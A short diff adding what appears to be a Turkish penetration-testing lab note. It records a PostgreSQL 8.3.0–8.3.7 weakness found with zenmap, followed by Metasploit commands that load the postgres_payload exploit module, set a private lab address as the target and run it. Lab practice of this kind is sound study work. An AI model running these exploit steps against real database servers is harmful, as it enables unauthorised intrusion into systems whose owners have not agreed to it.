@@ -1,0 +1,9 @@
+PostgreSQL DB 8.3.0 - 8.3.7 -> zenmap ile bulduğumuz açık.
+
+msfconsole
+
+use exploit/linux/postgres/postgres_payload
+set RHOST 10.0.2.7
+exploit
+
+
